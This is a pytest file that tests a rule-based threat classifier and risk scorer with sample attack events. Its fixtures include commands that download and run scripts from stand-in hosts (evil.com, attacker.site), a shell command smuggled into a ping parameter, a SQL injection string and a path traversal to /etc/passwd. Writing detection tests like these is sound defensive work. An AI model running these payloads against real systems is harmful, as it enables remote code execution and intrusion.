"""
Unit tests for rule-based Threat Intelligence Classifier and Risk Scoring Engine.
"""
import pytest
from app.classifier import classify_event

def test_classify_command_injection_wget():
    event = {
        "service": "SSH",
        "event_type": "COMMAND_EXEC",
        "source_ip": "198.51.100.22",
        "payload": "wget http://evil.com/malware.sh -O /tmp/mal.sh; chmod +x /tmp/mal.sh",
        "user_agent": "SSH-2.0-OpenSSH",
        "path": None
    }
    result = classify_event(event)
    assert result["classification"] == "COMMAND_INJECTION"
    assert result["risk_level"] == "CRITICAL"
    assert result["risk_score"] >= 90
    assert "wget" in result["matched_rule"]

def test_classify_command_injection_curl_bash():
    event = {
        "service": "HTTP",
        "event_type": "COMMAND_EXEC",
        "source_ip": "198.51.100.22",
        "payload": "curl -s http://attacker.site/drop.sh | bash",
        "user_agent": "curl/7.68.0",
        "path": "/api/tools/ping?host=127.0.0.1;curl"
    }
    result = classify_event(event)
    assert result["classification"] == "COMMAND_INJECTION"
    assert result["risk_score"] >= 90

def test_classify_sql_injection():
    event = {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "source_ip": "203.0.113.88",
        "payload": "admin' OR '1'='1' --",
        "user_agent": "Mozilla/5.0",
        "path": "/admin/login",
        "username": "admin' OR '1'='1"
    }
    result = classify_event(event)
    assert result["classification"] == "SQL_INJECTION"
    assert result["risk_level"] == "HIGH"
    assert result["risk_score"] >= 80

def test_classify_path_traversal():
    event = {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "source_ip": "192.0.2.45",
        "payload": "GET /../../../../etc/passwd HTTP/1.1",
        "user_agent": "Mozilla/5.0",
        "path": "/../../../../etc/passwd"
    }
    result = classify_event(event)
    assert result["classification"] == "PATH_TRAVERSAL"
    assert result["risk_level"] == "HIGH"

def test_classify_botnet_scanner_nikto():
    event = {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "source_ip": "185.220.101.5",
        "payload": "GET /test.php",
        "user_agent": "Mozilla/5.0 (compatible; Nikto/2.1.6; +http://cirt.net/nikto/)",
        "path": "/test.php"
    }
    result = classify_event(event)
    assert result["classification"] == "BOTNET_RECON"
    assert result["risk_level"] == "MEDIUM"
    assert result["risk_score"] == 55

def test_classify_botnet_scanner_sqlmap():
    event = {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "source_ip": "185.220.101.5",
        "payload": "GET /api/v1/users",
        "user_agent": "sqlmap/1.5.2#stable (http://sqlmap.org)",
        "path": "/api/v1/users"
    }
    result = classify_event(event)
    assert result["classification"] == "BOTNET_RECON"
    assert result["risk_level"] == "MEDIUM"

def test_classify_basic_login_probe():
    event = {
        "service": "SSH",
        "event_type": "LOGIN_ATTEMPT",
        "source_ip": "10.0.0.99",
        "username": "customuser",
        "password": "simplepassword",
        "payload": "SSH_AUTH user=customuser pass=simplepassword",
        "user_agent": "SSH-Client",
        "path": None
    }
    result = classify_event(event, db=None)
    assert result["classification"] == "CREDENTIAL_PROBE"
    assert result["risk_level"] == "MEDIUM"
